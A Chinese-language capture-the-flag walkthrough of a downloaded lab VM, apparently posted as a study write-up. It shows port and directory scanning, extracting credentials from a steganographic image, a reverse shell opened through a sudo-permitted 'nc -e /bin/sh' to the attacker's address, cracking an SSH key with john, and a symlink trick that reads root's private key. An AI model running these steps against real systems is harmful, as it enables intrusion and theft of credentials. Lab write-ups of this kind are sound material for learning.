前言：

每个人都有属于自己的一片森林，也许我们从来不曾去过，但它一直在那里，总会在那里，迷失的人迷失了，相逢的人会再相逢，即使是你最心爱的人，心中都有一片你无法到达的森林。

*本次文章只用于技术讨论，学习，切勿用于非法用途，用于非法用途与本人无关！所有环境均为在线下载的靶场，且在本机进行学习。

一、信息收集

nmap -sV -Pn -sC -A 192.168.56.184 -p 0-65535

对其进行目录扫描

gobuster dir -u http://192.168.56.184/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html

但是并没有发现什么有用的东西

查看页面源代码可以发现

得到一个用户名：alicia

还可以知道页面是一块白色的图片，对其进行下载看看是否有隐藏信息

curl -O http://192.168.56.184/white.png

zsteg white.png

得到一个密码，尝试与上面的用户名搭配登录ssh

二、SSH登录

上传提权脚本，进行探测

但是没有提权成功，查看suid

find / -perm -u=s -type f 2>/dev/null，也没有啥可以利用的东西

sudo -l

可以以emma用户身份执行nc，因此可以反弹一个shell以此得到emma的会话

三、权限提升

sudo -u emma nc -e /bin/sh 192.168.56.105 6666

获得稳定的shell：
python3 -c "import pty;pty.spawn('/bin/bash');"

但是也没有啥有用的信息

这里挺懵逼的，看了一下别人的wp发现，那个图片里面还有信息。。。

https://stegonline.georgeom.net/upload

上传图片后

得到密码：

seemstobeimpossible

成功登录到sophia用户，

sudo -l

尝试利用cat去读取root的id_rsa，但是失败了。

尝试读取isabella用户的id_rsa，同样失败。

直接尝试读取.invisible

sudo -u isabella cat /home/isabella/.invisible

有个ssh，可以尝试进行对isabella进行登录，不过登录需要密码，可以利用john去进行破解，不过我尝试登录后发现，该用户下没有什么有价值的东西。

ssh2john id_rsa >> a

john a --wordlist=rockyou.txt

密码爆破出来是：invisible

既然.invisible可以不用所有用户的认证，可以尝试将root的.ssh挂载进去，再利用cat读取。

ln -sf /root/.ssh/id_rsa .invisible

sudo -u root cat /home/isabella/.invisible

登录即可
